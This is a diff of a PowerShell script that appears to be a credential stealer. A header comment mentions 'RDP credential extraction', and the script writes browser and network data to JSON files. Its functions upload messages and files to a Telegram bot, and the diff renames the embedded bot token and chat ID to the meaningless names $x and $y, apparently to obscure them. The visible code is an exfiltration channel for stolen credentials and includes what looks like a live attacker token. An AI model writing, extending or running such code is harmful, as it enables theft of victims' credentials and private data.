@@ -6,8 +6,8 @@
 # Removed CSV generation, added proper RDP credential extraction, improved file naming and cleanup
 
 param(
-    [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
-    [string]$TelegramChatID = "2047893044"  # Your Chat ID
+    [string]$x = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
+    [string]$y = "2047893044"  
 )
 
 # Function to get public IP information
@@ -286,9 +286,9 @@ function Send-TelegramMessage {
     )
     
     try {
-        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
+        $uri = "https://api.telegram.org/bot$x/sendMessage"
         $body = @{
-            chat_id = $TelegramChatID
+            chat_id = $y
             text = $Message
             parse_mode = "HTML"
         }
@@ -345,7 +345,7 @@ function Send-TelegramFile {
             "--$boundary",
             "Content-Disposition: form-data; name=`"chat_id`"",
             "",
-            $TelegramChatID,
+            $y,
             "--$boundary",
             "Content-Disposition: form-data; name=`"caption`"",
             "",
@@ -358,7 +358,7 @@ function Send-TelegramFile {
             "--$boundary--"
         ) -join $LF
 
-        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
+        $uri = "https://api.telegram.org/bot$x/sendDocument"
         Write-Host "Sending file to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
         
         $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
@@ -640,7 +640,7 @@ Write-Host "City: $($ipInfo.City)" -ForegroundColor Cyan
 Write-Host "Files will be saved as:" -ForegroundColor Yellow
 Write-Host "Browser JSON: $BrowserJSONPath" -ForegroundColor Yellow
 Write-Host "Network JSON: $NetworkJSONPath" -ForegroundColor Yellow
-Write-Host "Telegram Chat ID: $TelegramChatID" -ForegroundColor Cyan
+Write-Host "Telegram Chat ID: $y" -ForegroundColor Cyan
 
 # Browser paths configuration
 $browsers = @{
